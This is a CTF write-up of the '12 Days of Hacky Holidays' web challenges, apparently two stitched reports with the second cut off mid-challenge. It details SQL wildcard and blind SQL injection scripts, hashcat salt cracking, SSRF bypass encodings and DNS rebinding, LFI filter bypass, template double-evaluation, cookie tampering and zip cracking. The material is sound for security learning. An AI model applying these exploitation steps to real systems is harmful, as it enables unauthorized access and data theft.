There is only one valid endpoint - /user. When we call it without the query parameters, the response is Invalid content type detected, but when we call it with any parameter: /api/user?foo=bar for example, the response is Expected HTTP status 200, Received: 400. This status in Grinch API doc means that we sent invalid GET/POST variable(s). Let's think what parameters can accept /user endpoint?
id
uuid
login
username
password
two parameters
Let's try all of them. When we send two parameters: username and password: /api/user?username=&password=, the response is Expected HTTP status 200, Received: 204. Good, we found the valid parameters. Now let's think how the server uses them in the /user endpoint? I guess it filters users by them. So we can try to guess the both parameters' values, then /user endpoint will return status code 200 (select some user), and SSRF response will be Invalid content type detected again. Unfortunately bruteforce attack can't be used here, because we will need to send the millions of requests. SQLi injection doesn't work also. But maybe the server doesn't escape wildcard characters: percentage % and underscore _ in SQL query? Let's try to send the following path: /api/user?username=%25&password=%25, and the response will be Invalid content type detected. Cool, that means, that we can use the same technics as we used in the Evil Quiz challenge.
Let's create the python script (it uses some functions from the script above):
Code 814 Bytes
1def get_data():
2  known = ''
3  known_max_len = 20
4
5  charset = string.ascii_lowercase + string.digits + '_'
6  while True:
7    found_next = False
8    for char in charset:
9      temp_char = '\\' + char if char == '_' or char == '%' or char == '"' else char
10      tmp_known = known + temp_char
11
12      params = {
13        'username': tmp_known + '%',
14        'password': '%'
15      }
16      query = 'user/?{}'.format(urlencode(params, quote_via=quote))
17
18      res = get_data(query)
19      if res['text'] == 'Invalid content type detected':
20        known += char
21        found_next = True
22        print(known)
23        break
24    if (not found_next):
25      print_and_exit('Unable to find the next char')
26    elif (len(known) == known_max_len):
27      print_and_exit('Found the first {} chars: {}'.format(known_max_len, known))
It will find that username is grinchadmin, and the password is s4nt4sucks (btw, nice password:)).
Now, log in by using the found credentials, and there is a flag:
<image_9>
The 11th flag: flag{07a03135-9778-4dee-a83c-7ec330728e72}.
Grinch Network Attack Server
The last app allows us to attack Santa's servers to take them down.
There are three attacks created for us. Attack is launched using the data in payload query parameter: eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMzMiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ==. As we see, the value is base64 encoded string. The decode value is JSON object with target and auth fields: {"target":"203.0.113.33","hash":"5f2940d65ca4140cc18d0878bc398955"}. If target is valid (IPv4 address or Canonical name) and hash token is valid for this target, then app launches a new attack. After that, the client uses JSON polling to get the status of attack.
/launch?payload=<base64>
/launch/<randomly-generated-token>.json
/launch/<randomly-generated-token>.json?id=<int>
When attack is finished, we can get the complete log calling /launch/<randomly-generated-token>.json (without id):
Code 770 Bytes
1[
2  {"id":"32569","content":"Setting Target Information","goto":false},
3  {"id":"32570","content":"Getting Host Information for: 203.0.113.213","goto":false},
4  {"id":"32571","content":"Spinning up botnet","goto":false},
5  {"id":"32572","content":"Launching attack against: 203.0.113.213 \/ 203.0.113.213","goto":false},
6  {"id":"32573","content":"ping 203.0.113.213","goto":false},
7  {"id":"32574","content":"64 bytes from 203.0.113.213: icmp_seq=1 ttl=118 time=18.6 ms","goto":false},
8  {"id":"32575","content":"64 bytes from 203.0.113.213: icmp_seq=2 ttl=118 time=22.3 ms","goto":false},
9  {"id":"32576","content":"64 bytes from 203.0.113.213: icmp_seq=3 ttl=118 time=21.8 ms","goto":false},
10  {"id":"32577","content":"Host still up, maybe try again?","goto":false}
11]
What this attack does? It tries to ping the selected host, and if it's down, returns a link in a goto field. Our goal is to take down the Grinch server, so we need to find a way how to send Grinch's host in target.
Let's look again at the decoded payload JSON:
Code 74 Bytes
1{
2  "target":"203.0.113.33",
3  "hash":"5f2940d65ca4140cc18d0878bc398955"
4}
hash looks like as md5sum. If this is real md5 hash, how it can be generated?
md5sum(target)
md5sum(target + salt)
md5sum(salt + target)
The first statement is wrong, let's check other. We know the encrypted value - 203.0.113.33, we know the hash - 5f2940d65ca4140cc18d0878bc398955, so we need to find a way how to guess salt!? For this task we can use, the super fast tool for password recovery - hashcat. We will run it with the following parameters:
-a 0 - dictionary attack, trying all the words in a list
-m 10 - hash mode, salt + password
5f2940d65ca4140cc18d0878bc398955:203.0.113.33 - known hash and password
rockyou.txt - the dictionary file
Code 82 Bytes
1$ hashcat -O -m 10 -a 0 5f2940d65ca4140cc18d0878bc398955:203.0.113.33 rockyou.txt 
A few seconds after the start, hashcat will find the salt - mrgrinch463.
Let's use mrgrinch463 to generate auth token for the localhost (127.0.0.1) target and launch the attack against Grinch's host:
target: 127.0.0.1
salt: mrgrinch463
string for encryption: mrgrinch463127.0.0.1
md5sum for mrgrinch463127.0.0.1: 3e3f8df1658372edf0214e202acb460b
payload: {"target":"127.0.0.1","hash":"3e3f8df1658372edf0214e202acb460b"}
payload encoded in base64: eyJ0YXJnZXQiOiIxMjcuMC4wLjEiLCJoYXNoIjoiM2UzZjhkZjE2NTgzNzJlZGYwMjE0ZTIwMmFjYjQ2MGIifQ==
url: https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIxMjcuMC4wLjEiLCJoYXNoIjoiM2UzZjhkZjE2NTgzNzJlZGYwMjE0ZTIwMmFjYjQ2MGIifQ%3d%3d
Hmm, but when we send the request, the log of the attack is:
Code 237 Bytes
1[
2  {"id":"36389","content":"Setting Target Information","goto":false},
3  {"id":"36392","content":"Getting Host Information for: 127.0.0.1","goto":false},
4  {"id":"36393","content":"Local target detected, aborting attack","goto":false}
5]
It seems, that the server has some SSRF protection mechanism. Well, IP address can be represented in the dozens of formats, let's try to bypass the server protection using one of them:
dot notation: 127.0.0.1
localhost: localhost
IPv6: [::1]
drop the zeros: 127.0.1
drop the zeros: 127.1
decimal: 2130706433
octal: 017700000001
hex: 7f000001
hex: 0x7f.0.0.1
Unfortunately, all of them doesn't work.
But what about a canonical name? Let's run attack against hackyholidays.h1ctf.com target:
Code 325 Bytes
1[
2  {"id":"36293","content":"Setting Target Information","goto":false},
3  {"id":"36295","content":"Getting Host Information for: hackyholidays.h1ctf.com","goto":false},
4  {"id":"36296","content":"Host resolves to 18.216.153.32","goto":false},
5  {"id":"36297","content":"Local target detected, aborting attack","goto":false}
6]
The response almost the same as above, but now, the server resolves the hostname with DNS. What if the server validates IP after DNS resolving and after that pings the original hostname?
There is the type of SSRF attack called DNS rebinding. Shortly, this is a method of manipulating resolution of domain names. Let's build our SSRF DNS rebinding attack. We need to have hostname that will be resolved to 1.1.1.1 (for example) on the first call to bypass the server SSRF protection, and resolved to 127.0.0.1 every time after that, and we'll attack the Grinch's host.
For this attack we will use Whonow DNS Server tool, there is already the working server that can do what we need. Build target url A.1.1.1.1.1time.127.0.0.1.forever.rebind.network, and let's run attack against it:
Code 759 Bytes
1[
2  {"id":"38456","content":"Setting Target Information","goto":false},
3  {"id":"38457","content":"Getting Host Information for: A.1.1.1.1.1time.127.0.0.1.forever.rebind.network","goto":false},
4  {"id":"38458","content":"Host resolves to 1.1.1.1","goto":false},
5  {"id":"38459","content":"Spinning up botnet","goto":false},
6  {"id":"38460","content":"Launching attack against: A.1.1.1.1.1time.127.0.0.1.forever.rebind.network \/ 127.0.0.1","goto":false},
7  {"id":"38461","content":"No Response from attack server, retrying...","goto":false},
8  {"id":"38462","content":"No Response from attack server, retrying...","goto":false},
9  {"id":"38463","content":"No Response from attack server, retrying...","goto":"\/attack-box\/challenge-completed-a3c589ba2709"}
10]
Wow, we got a link in goto field, let's open it, and there is the last flag:
<image_10>
The 12th flag: flag{ba6586b0-e482-41e6-9a68-caf9941b48a0}.
Conclusion
I would like to say "big thanks" to the organizers and to all the people who helped me, when I have been stuck. It was really fun event:)!
References
gobuster
John the Ripper
thc-hydra
sqlmap
hashcat
rebind.network
MD5 conversion and reverse lookup
Server-Side Template Injection
Scientific notation
SQL injection UNION attacks
MySQL Hexadecimal Literals
MD5 hash with salt
Server-Side Request Forgery
Hacker0x01 Twitter
Hacky-Holidays Discord channel
Impact
Taking Santa's servers down and canceling Christmas!



==================================================

Report File: 1069175.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- Information Disclosure

Contents:

Summary
This was a real fun CTF and I really enjoyed solving the challenges. Great job on creating the challenges.
This is my writeup for the "12 Days of Hacky Holidays CTF". I hope you enjoy reading it, and I hope others reading it will pick up a trick or two.
Flags:
This is all the flags found during the CTF
Flag 1: flag{48104912-28b0-494a-9995-a203d1e261e7}
Flag 2: flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}
Flag 3: flag{b705fb11-fb55-442f-847f-0931be82ed9a}
Flag 4: flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}
Flag 5: flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}
Flag 6: flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}
Flag 7: flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}
Flag 8: flag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}
Flag 9: flag{6e8a2df4-5b14-400f-a85a-08a260b59135}
Flag 10: flag{99309f0f-1752-44a5-af1e-a03e4150757d}
Flag 11: flag{07a03135-9778-4dee-a83c-7ec330728e72}
Flag 12: flag{ba6586b0-e482-41e6-9a68-caf9941b48a0}
Intro
Like a lot of other bounty hunters I enjoy reading security related news on Twitter, but on this particular day, something in my feed caught my attention. It was this tweet from twitter.com/hacker0x01 announcing "12 days of hack holiday":
<image_0>
The first thought that hit me was: "A CTF with one flag each day? Maybe I can solve one flag each day AND get some sleep as well? This sounds like an unusual CTF, this is going to be a first. I'm in!"
Writeup
Before we start I would like to introduce the common tools that I have used to solve this CTF, and that I use during my regular security research.
FFuF - This is an awesome tool, and if this is not familiar to you I highly recommend you check this out. This tool can be used for almost every kind of fuzzing related to web. FFuF is usually used in conjunction with a suitable wordlist for the target. When you use this tool always rate limit it, since the default number of threads and request per second is pretty aggressive. You can use -t to control the number of threads and -rate to control the number of request per second. Be nice to the other CTF players and do not overflow the server with traffic.
SecList - A very nice collection of wordlists (maybe the best) that is usually used together with a tool, such as FFuF, to do directory brute force, password guessing or other similar things. All wordlists I have used to solve this CTF can be found in the SecList project.
Burp - Every web applications testers go-to intercepting proxy. This has been used to proxy almost all traffic during this CTF.
Python - An awesome programming language, that is really fast to create small scripts that can automate some cumbersome manual task. To solve this CTF, a couple of Python script was written to automate some of the tasks.
Cyberchef - Nice tool to decode/hash/brute force etc. Really fast to just hash or decode something.
Ok, now that we are done with the intro, let us get to some hacking!
As always, we start by reading the program brief linked from the announcement tweet. We find the scope and observe that the only in scope domain is hackyholidays.h1ctf.com. So we need to ensure that we only send traffic to hackyholidays.h1ctf.com in order to be within the scope of the CTF.
Flag 1 - robots.txt
By browsing to https://hackyholidays.h1ctf.com we are greeted with the following image:
<image_1>
This is not that interesting. Of course the Grinch want to keep out us out, we are here to take down his network such that he can not ruin the holidays! To find out if the server is hosting any other interesting files or endpoints, we run FFuF with a good wordlist. Since we know very little about the target, a good starting point is usually the common.txt file from the awesome SecLists project. So by running a content-discovery with FFuF using the common.txt wordlist and filtering out the 404 responses, we get the following result:
<image_2>
From the FFuF result, We observe that we get a 200 OK response from the /robots.txt endpoint. This is usually a good starting point to find other, app specific locations, that the common wordlists do not contain. So by browsing to the robots.txt file in our browser we get the following result from the server, containing the first flag:
<image_3>
Flag 1 is: flag{48104912-28b0-494a-9995-a203d1e261e7}

Flag 2 - s3cr3t ar3a
If we observe the robots.txt from the previous step closely, we see that it has one disallow entry in the file, namely /s3cr3t-ar3a. If we points our browser to https://hackyholidays.h1ctf.com/s3cr3t-ar3a endpoint in our browser we see the following page:
<image_4>
It looks like the page has been moved. But before we move on, we should inspect the HTML to verify that there is no part of the web page that contains any hidden information. We can use the Chrome developer tools to inspect the HTML, and lo and behold! The second flag is displayed in front of our eyes inside the data-info attribute on one of the div tags:
<image_5>
Flag 2 is: flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}

Flag 3 - People Rater
Along with flag 2 in the data-info attribute of the div, a next-app attribute with the value /apps was set. This indicates that in order to find the next flag we must navigate to https://hackyholidays.h1ctf.com/apps. As soon as the challenge was release a link appeared to the "People Rater" application. By clicking the link we are greeted with the mission brief for the People Rater application:
Mission brief:
The grinch likes to keep lists of all the people he hates. This year he's gone digital but there might be a record that doesn't belong!
So we need to find a record that does not belong in the People Rater application. If we start by clicking on one of the items in the Grinch People Rater list, we observe that a HTTP request is made to the back-end URL /people-rater/entry. When the user clicks the item "Tea avery" in the list, the URL is called with the id parameter set to eyJpZCI6Mn0=. The ey part is usually an indicator of a base64 encoded JSON payload. So by decoding the base64 value in your favorite decoder (Cyberchef or using the Burp suite decoder) we get the value: {"id":2}. By clicking on the other items in the in the list, we get a similar request but with another id.
To figure out the valid set of ids, we can use Burp intruder and fuzz every number from 0 to 100 in the id field. If we do this, we find that by sending a payload with the id of 1 we get the following payload from the server:
Code 153 Bytes
1{
2  "id": "eyJpZCI6MX0=",
3  "name": "The Grinch",
4  "rating": "Amazing in every possible way!",
5  "flag": "flag{b705fb11-fb55-442f-847f-0931be82ed9a}"
6}
7
Flag 3 is: flag{b705fb11-fb55-442f-847f-0931be82ed9a}

Flag 4 - Swag Shop
Mission Brief:
Get your Grinch Merch! Try and find a way to pull the Grinch's personal details from the online shop.
So we will need to find the Grinch's personal detail from the shop, let us explore the shop to check if it is possible. By clicking the purchase button, from the front page of the application, a POST request to the following url is made: /swag-shop/api/purchase. The /api part of the URL looks very interesting. To check if there is some other endpoints on the /api path, we can run FFuF against it with the common.txt file from SecList:
<image_6>
The FFuF run yields three endpoints: /session, /stock and /user. Let us start by looking at why /user yields a 400 response, not 200 that the other endpoints yields. By browsing to the following url: https://hackyholidays.h1ctf.com/swag-shop/api/user we can access the user endpoint path of the API, which gives the following message:
Code 35 Bytes
1{"error":"Missing required fields"}
A 400 response and a message like this is sometimes an indication that the endpoint is expecting some parameters, but we are not providing them. A fast way to check if we may be missing some parameters is to do a parameter brute force with FFuF. We choose the burp-parameter-names.txt wordlist from SecList to perform this brute force. We will filter out any 400 responses, to check if any of the parameter names will yield any other responses than 400:
<image_7>
So the by adding the parameter uuid, we get a 404 response instead of a 400. If we now navigate our browser to the URL with the parameter uuid set to value, like this: https://hackyholidays.h1ctf.com/swag-shop/api/user?uuid=value we get the following JSON response from the endpoint:
Code 40 Bytes
1{"error":"Could not find matching uuid"}
This is a clear indication that if we can find a valid uuid, we may get a valid response from this endpoint, hopefully containing some information about the user. Looking back at the initial fuzz we did to discovery API endpoints we see that there is a /session endpoint on the api path. By navigating to https://hackyholidays.h1ctf.com/swag-shop/api/sessions we get a response back that contains a JSON list of sessions values that is base64 encoded. By decoding them we find one UUID inside the "user" property of the third user with the value: C7DCCE-0E0DAB-B20226-FC92EA-1B9043
By navigating the browser to the URL: https://hackyholidays.h1ctf.com/swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043, we get the following JSON response from the server that contains the Grinch's personal details and the flag:
Code 260 Bytes
1{
2  "uuid": "C7DCCE-0E0DAB-B20226-FC92EA-1B9043",
3  "username": "grinch",
4  "address": {
5    "line_1": "The Grinch",
6    "line_2": "The Cave",
7    "line_3": "Mount Crumpit",
8    "line_4": "Whoville"
9  },
10  "flag": "flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}"
11}
Flag 4 is: flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}

Flag 5 - Secure Login
Mission brief:
Try and find a way past the login page to get to the secret area.
So for this flag we will have to find a way to get past the login page, and access the secret area. When we open the application, a login page where we must enter a username and password, in order to log in, is displayed. If we enter the username "admin" with the password "admin", the following message is displayed back to the user: Invalid Username. Since only the username is mention in the message displayed back to the user, this application may give another error message for a valid user. If this is the case we can distinguish between a valid user and an invalid user. That means we can find a valid user and launch a password brute force attack against the user, and if we are lucky gain access to the secret area. Lets give it a try! We fire up FFuF again to do a brute force attack against the username to check if we are able to discover any valid users:
<image_8>
In this run with FFuF we use the -fr option to filter out the regular expression "Invalid Username". This means that each result that is returned from FFuF does not contain the specified regular expression. From the result we see that the username access will respond with something other than "Invalid Username" in the response. If we try to login manually via the browser with the username "access" and a random password, the application will now return the message: Invalid Password. If we now run FFuF again, but change the fuzz location to the password field with the username set equal to "access", we can brute force the password of the access user:
<image_9>
So the username / password combination of access / computer will result in a 302 redirect from the server. If we try the discovered credentials in the browser, the 302 redirect from the server will set an access cookie named "secure-login" and redirect back to "/secure-login". Now, since we are logged in, the page will show a table with secure files that the user can download:
<image_10>
The page says that there is no files to download, maybe if we could become another user there would be some files for us to download.
If we look closely at the secure-login cookie, the value starts with a familiar "ey" pattern. This value is not only base64 encoded, it is also URL encoded. So if we are to retrieve the correct decoded value we must first URL decode before we base64 decode the value in order to preserve the correct value. After decoding our secure-login cookie we end up with the following JSON object:
Code 59 Bytes
1{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":false}
The admin property of the cookie is set to false, pretty interesting. Let us check what happens if we change the value from false to true, base64 encode it and then URL encode it. We end up with the following value:
Code 82 Bytes
1eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjp0cnVlfQo%3D
If we change the secure-login cookie to this new value, via the browsers developer tools, we get the following result when refreshing the page:
<image_11>
Ok, so we now got a file to download. Let us download the file and check the content of the zip file. By clicking the link in the table, the "my_secure_files_not_for_you.zip" file is downloaded. But when we try to extract the file via unzip my_secure_files_not_for_you.zip we are prompted for a password.
Ok, so we need to crack the password on the zip file. We can do this by using the fcrackzip utility with the rockyou.txt wordlist. By running frackzip towards this downloaded zip file, with the rockyou.txt wordlist as input, we get the following result:
<image_12>
From the result we see that the password is: hahahaha. So if we now try to unzip the file with unzip again and enter the password, two files are now extracted. The first file is an image with the name XXX.png. Please cover the eyes of any children near the screen before you scroll down:
<image_13>
And the second file is the flag.txt file that contains the 5th flag.
Flag 5 is: flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}

Flag 6 - My Diary
Mission brief:
Hackers! It looks like the Grinch has released his Diary on Grinch Networks. We know he has an upcoming event but he hasn't posted it on his calendar. Can you hack his diary and find out what it is?
So we need to hack the Grinchs diary to retrieve and find his upcoming event. Upon browsing to the URL https://hackyholidays.h1ctf.com/my-diary/ we are immediately redirected to https://hackyholidays.h1ctf.com/my-diary/?template=entries.html. The template parameter looks really interesting and may hint to a Local File Inclusion vulnerability. Let us do a short content discovery with FFuF to see if there are any other interesting files on the server.
<image_14>
If we browse to the index.php via the URL https://hackyholidays.h1ctf.com/my-diary/index.php, the server will just redirect us back to the main page. Let see if the template parameter may be vulnerable by changing the value from entries.html to index.php instead. When we open the following URL: https://hackyholidays.h1ctf.com/my-diary/?template=index.php, the browser will just display a blank page, but if we inspect the page with developer tools or look at the HTTP response in Burp, we discover the following PHP code is returned in the HTTP response:
Code 689 Bytes
1<?php
2if( isset($_GET["template"])  ){
3    $page = $_GET["template"];
4    //remove non allowed characters
5    $page = preg_replace('/([^a-zA-Z0-9.])/','',$page);
6    //protect admin.php from being read
7    $page = str_replace("admin.php","",$page);
8    //I've changed the admin file to secretadmin.php for more security!
9    $page = str_replace("secretadmin.php","",$page);
10    //check file exists
11    if( file_exists($page) ){
12       echo file_get_contents($page);
13    }else{
14        //redirect to home
15        header("Location: /my-diary/?template=entries.html");
16        exit();
17    }
18}else{
19    //redirect to home
20    header("Location: /my-diary/?template=entries.html");
21    exit();
22}
If we analyze the PHP file we find that the code does the following:
Fetch the template parameter from the request and store it inside the $page variable
For every character in the $page variable that is not in the set a-z, A-Z, 0-9 or dot, replace them with nothing and store this result in the $page variable.
For every instance of the string admin.php in the $page variable, replace it with nothing and store this result in the $page variable.
For every instance of the string secretadmin.php in the $page variable, replace it with nothing and store the result in the $page variable.
Finally the script will check if the location in the $page variable exist in a file on disk, if it does, the content of the file will be returned. If not the user is redirected back to the main page.
Note the comment above the line that replaces secretadmin.php in the index.php file. It seems that the Grinch have moved the amdin.php file to secretadmin.php, so that is the file we should try to read. We can do this by navigating to the URL: https://hackyholidays.h1ctf.com/my-diary/secretadmin.php in the browser. This results in a page that display the message You cannot view this page from your IP Address. Ok, so we will have to find another way to read this file.
Let us go back to the index.php file we manage to download. If we are able to construct a string, that when the regex run against it, will result in setting the $page variable to secretadmin.php, we should be able to read the content of secretadmin.php file. By playing a little bit with the input to the template parameter we find that the string secretadminsecretadminadmin.php.phpadmin.php.php is able to bypass the check and read the content of secretadmin.php. That means we can navigate to the following URL: https://hackyholidays.h1ctf.com/my-diary/?template=secretadminsecretadminadmin.php.phpadmin.php.php and we are able to browse the Grinchs calendar and see that on the 23rd of December he has scheduled an event to "Launch DDoS Against Santa's Workshop!". Let us hope we are able to stop his attack in time!
The page will also show the 6th flag:
<image_15>
Flag 6 is: flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}

Flag 7 - Hate Mail Generator
Mission Brief:
Sending letters is so slow! Now the grinch sends his hate mail by email campaigns! Try and find the hidden flag!
Upon launching the Hate Mail Generator application we see a page with a list of one previous (Hate) mail campaign and the ability to create a new campaign. By clicking the name of the old campaign we can see the name, subject and markup of the campaign.
The markup is set to:
Code 134 Bytes
1{{template:cbdj3_grinch_header.html}} Hi {{name}}..... Guess what..... <strong>YOU SUCK!</strong>{{template:cbdj3_grinch_footer.html}}
It is very interesting that the campaign contains the ability to include a template via the {{template:<TEMPLATE NAME>}}, let us make a note of that and we will probably come back this later.
The application also supports to preview a template, this feature can be accessed by clicking the "preview button" on an old campaign. The template will then be rendered and displayed back to the user.
On the front page there is also the button to create a new campaign. If we start a new campaign we are able to add a name, subject and markup for the template. If we click the "create" button, on the new campaign page, we get a message saying that we are out of credits. So we can not create any new campaigns, however we are able to enter the markup and preview our campaign.
Before we try anything else, it would be good idea to do a regular content discovery with FFuF to check again for any hidden files on the server that the web application may not be linking to. We run FFuF with the common.txt file against the Hate Mail Generator application:
<image_16>
So we found a template folder, if we browse this folder we find the following 3 templates:
cbdj3_grinch_header.html
cbdj3_grinch_footer.html
38dhs_admins_only_header.html
The first two looks pretty generic, but template number 3 named "38dhs_admins_only_header.html" looks very interesting. If we try to open the template in the browser we just get a 403 Forbidden response from the server. Maybe if we could include the template via the template-include tag, we could read the template file.
If we create a new template with the following markup:
Code 49 Bytes
1Hello {{template:38dhs_admins_only_header.html}} 
And then click the preview button, we get a message from the server saying: "You do not have access to the file 38dhs_admins_only_header.html". So this can not be the right way. When I hack on template systems, there is always a comic that pops up in the back of my hacker mind, and it is this one:
<image_17>
So if we can make the application double evaluate our tag, maybe we can force it to read the "38dhs_admins_only_header.html" file, even though we do not have access. If we inspect the request we just made to the preview page of our new campaign closely, we find some URL encoded parameters, and if we URL decode them we get the following:
Code 119 Bytes
1preview_markup=Hello {{template:38dhs_admins_only_header.html}} &preview_data={"name":"Alice","email":"alice@test.com"}
So the request that goes to the server contains the preview_data JSON object, that contains the data that probably is used when rendering the application. So if we are to perform a double evaluation, we can add a new variable, say "webhak", and set that variable to the following value: {{template:38dhs_admins_only_header.html}}, and then in the markup we render the webhak value like this Hello {{webhak}}. The request POST data looks like this, before url encoding:
Code 120 Bytes
1preview_markup=Hello , {{webhak}} &preview_data={"name":"Alice", "webhak":"{{template:38dhs_admins_only_header.html}}" }
The server will then respond with the following page that contains the flag:
<image_18>
Flag 7 is: flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}

Flag 8 - Forum
Mission brief: The Grinch thought it might be a good idea to start a forum but nobody really wants to chat to him. He keeps his best posts in the Admin section but you'll need a valid login to access that!
This was a particular hard challenge if you did not proceed through the right steps. I waste some time on this challenge going down a couple of rabbit holes, but manage to solve it in the end.
When you open the main page you see a list of forums and and message saying that we need to be admin to see these posts. There is also a login button in the top corner that will lead us to the login page. When we browse the application we find some posts in the Christmas forum, but nothing on the pages sticks out or screams vulnerable.
As usual, I like to run FFuF to see if there is anything the application is not linking to, but may be available upon directly navigating to the file or endpoint:
<image_19>
When running FFuf we discover the /phpmyadmin endpoint, which returns another login page when we browse to it, this seems interesting. If we run a brute force attack with common login credentials, it yields no valid results.
After spending quite some time trying to find an attack vector on an application and looking at it from different angles without finding anything, it can sometimes be smart to take a large step back. A good thing to do is to do some recon and check Google and Github for the organization that may have created the application you are hacking. In some cases you might find the source code of the application, which you may be able to find a vulnerability in by doing some code review.
By checking Github, we find that the "Grinch Networks" actually has a Github page: https://github.com/Grinch-Networks that looks like an organization page for something called "Grinch-Networks" and one repository named "forum" available - https://github.com/Grinch-Networks/forum. If we check the commit history for the repository, wee see that there is 4 commits. The commit with the comment "Small fix" stands a bit out and by browsing to the commit changelog here https://github.com/Grinch-Networks/forum/commit/efb92ef3f561a957caad68fca2d6f8466c4d04ae, we can see that somebody checked in some credentials for the database, then tried to remove them. However they were only deleted from the source code, not the git history.
The user name is forum and the password is 6HgeAZ0qC9T6CQIqJpD. These credentials are not valid on the main application login page, but they are valid on the phpmyadmin login page. By logging in to the PHP myadmin application and by navigating to forum -> user (https://hackyholidays.h1ctf.com/forum/phpmyadmin?db=forum&table=user) we find the following set of information:
id	username	password	admin
1	grinch	35D652126CA1706B59DB02C93E0C9FBF	1
2	max	388E015BC43980947FCE0E5DB16481D1	
The password column really looks like some kind of hash, so if we can crack one of them we may gain entry to the forum application. This is the result of running both hashes through crackstation.net.
<image_20>
So the user grinch should have the password BahHumbug. If we then navigate to the forum login page, located at https://hackyholidays.h1ctf.com/forum/login, we can now log in as the grinch with these credentials, and in the admin section (https://hackyholidays.h1ctf.com/forum/3/2) we will find the flag and the grinchs secret plan:
<image_21>
As we can read from the forum post, the Grinch is looking for his IP addresses in order to launch a DDoS attack! Hopefully we will be able to take him down before he does so!
Flag 8 is: flag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}

Flag 9 - Evil Quiz
Mission brief: Just how evil are you? Take the quiz and see! Just don't go poking around the admin area!
Navigating the browser to the evil quiz application, the following page is displayed to us:
<image_22>
In the top right there is a button to log in to the admin application. To access any other part of the application, the user must first enter a name and submit it to the application. By submitting a name we are now allowed to access the quiz. If we submit the quiz, by clicking the finish button, the user is now navigated to the last page of the application, the score page. The score page will display your name, your quiz score and number of other players with the same name as you.
The name of the user is the only input field that the application are expecting from the user, so this is probably where we should focus our effort. If we change then name of the user, we can try to enter the following payload to look for a SQL-injection, at the first screen: hopefullyNoOneElseHasThisUsername' or 1=1 -- (there must be a space after the two dashes). If we submit the name and navigate to the score page of the application we observe that the application returns a message saying that "There is XXX other player(s) with the same name as you!", where XXX is replaced by a pretty large number. If we change the name to hopefullyNoOneElseHasThisUsername' or 1=2 -- , and the open the score page again, we observe that there is now always 0 other player(s) with the same name. This is a strong indicator that we have a blind sql injection vulnerability that we probably can exploit, since we can trigger a conditional response. We will skip the background on how to exploit such a vulnerability, if anyone is interested in more about the subject, I recommend the Blind SQL injection article on Portswigger.
To exploit this vulnerability we can create a Python script to perform a brute force of some content in the database for us. The appendix section have the Python script listed as flag9-solver.py. Since this server is a bit slow, we need to be a little bit smart of what information we want to dump from the database, to try to avoid dumping the whole database. The database server is probably MySQL, so if we query the "information_schema.tables" table, and order the results descending by the table create_time, we can pick the newest created table, since this is probably the most interesting. In MySQL it is possible to pick the latest created table like this:
Code 85 Bytes
1select table_name from information_schema.tables order by create_time desc limit 0,1;
We use this technique in the "get_latest_created_table_name" function of the flag9-solver.py script. The script will dump the content of the latest created table. When we run the Python script we get the following output:
<image_23>
So the latest created table in the database is the "admin" table, and the content of looks like this:
id	username	password
1	admin	S3creT_p4ssw0rd-$
So now we have a set of admin credentials, this is very interesting. By using these credentials we are able to login into the admin area of the Evil Quiz application. When we login with the credentials we are greeted with the admin area of the Evil quiz application that contains the flag:
<image_24>
Flag 9 is: flag{6e8a2df4-5b14-400f-a85a-08a260b59135}

Flag 10 - Signup Manager
Mission brief:
You've made it this far! The grinch is recruiting for his army to ruin the holidays but they're very picky on who they let in!
One potential way to infiltrate the Grinchs network and stop the DDoS attack against Santa servers is that we could get recruited into the Grinchs army. We could then gather some intelligence on the servers and techniques that they are planning on using, and possibly stop him and his army from taking down Satan! We are probably getting closer, so let us check what we can do with the signup manager.
As usually we start out with a content discovery with FFuF and the commons.txt from SecLists:
<image_25>
These files do not look that interesting. The index.php file is the main page of the application, and the admin.php gives a message: You cannot access this page directly. So we are not able to access the admin page by just browsing to it.
By viewing the source of the index.php file we find the following comment: <!-- See README.md for assistance -->. Readme files are usually very interesting because they will sometime contain information on what product the site is running, what framework and which version, and similar information. This can usually be used to narrow down what kind of attacks are available. So if we browse to https://hackyholidays.h1ctf.com/signup-manager/README.md we can download the README.md file for the signup manager. The file contains the following:
Code 712 Bytes
1# SignUp Manager
2
3SignUp manager is a simple and easy to use script which allows new users to signup and login to a private page. All users are stored in a file so need for a complicated database setup.
4
5### How to Install
6
71) Create a directory that you wish SignUp Manager to be installed into
8
92) Move signupmanager.zip into the new directory and unzip it.
10
113) For security move users.txt into a directory that cannot be read from website visitors
12
134) Update index.php with the location of your users.txt file
14
155) Edit the user and admin php files to display your hidden content
16
176) You can make anyone an admin by changing the last character in the users.txt file to a Y
187b) Default login is admin / password
Our first attempt was to log in with the default admin credentials from the README.md file, admin / password. These credentials are valid, but will only redirect us to the user area. If we are to become part of the Grinch army, we must access the admin area. So let us take a step back!
According to the README.md file there users are stored inside of a users.txt file, but the readme states that it is supposed to be in a folder that the cannot be read from the website visitors, let us check if the site administrator may have forgotten to move the users.txt file:
<image_26>
A 404 page means that the file does not exists, so it looks like the site administrator followed the readme. Maybe the administrator have forgotten to delete the signupmanager.zip file that may contain the source code of the software running. So by navigating to https://hackyholidays.h1ctf.com/signup-manager/signupmanager.zip we are able to download the .zip file containing the source.
